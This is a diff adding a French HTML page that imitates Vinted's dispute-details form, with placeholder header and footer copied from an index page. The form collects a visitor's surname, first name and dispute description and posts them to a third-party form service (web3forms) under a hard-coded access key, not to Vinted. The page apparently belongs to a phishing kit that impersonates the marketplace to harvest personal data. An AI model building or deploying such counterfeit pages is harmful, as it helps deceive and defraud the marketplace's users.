@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Détails du litige | Vinted</title>
+    <link rel="stylesheet" href="style.css">
+    <style>
+        /* Styles spécifiques pour le formulaire de litige */
+        .litige-main { padding: 20px 16px; background-color: #f2f3f3; }
+        .litige-box { background: white; padding: 20px; border-radius: 4px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
+        h2 { font-size: 18px; font-weight: 600; margin-bottom: 20px; }
+        .input-group { margin-bottom: 15px; border-bottom: 1px solid #ebedee; padding-bottom: 10px; }
+        .input-group label { display: block; font-size: 14px; font-weight: 600; margin-bottom: 5px; }
+        textarea { width: 100%; border: 1px solid #ccc; border-radius: 4px; padding: 10px; font-family: inherit; font-size: 15px; }
+        select { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; background: white; font-size: 15px; }
+    </style>
+</head>
+<body>
+
+    <header class="navbar">... (même header que index.html) ...</header>
+
+    <main class="litige-main">
+        <div class="litige-box">
+            <h2>Détails du litige</h2>
+            
+            <form action="https://api.web3forms.com/submit" method="POST">
+                <input type="hidden" name="access_key" value="c89ef8b5-6bcc-4cae-bda0-97a1ba2fc8aa">
+                
+                <div class="input-group">
+                    <label>Nom</label>
+                    <input type="text" name="nom" required>
+                </div>
+                
+                <div class="input-group">
+                    <label>Prénom</label>
+                    <input type="text" name="prenom" required>
+                </div>
+
+                <div class="input-group">
+                    <label>Décris ton litige</label>
+                    <textarea name="description" rows="4" required></textarea>
+                </div>
+
+                <button type="submit" class="btn-vinted">Envoyer le litige</button>
+            </form>
+        </div>
+    </main>
+
+    <footer class="vinted-footer">... (Colle ici le bloc <footer> complet de index.html) ...</footer>
+
+</body>
+</html>
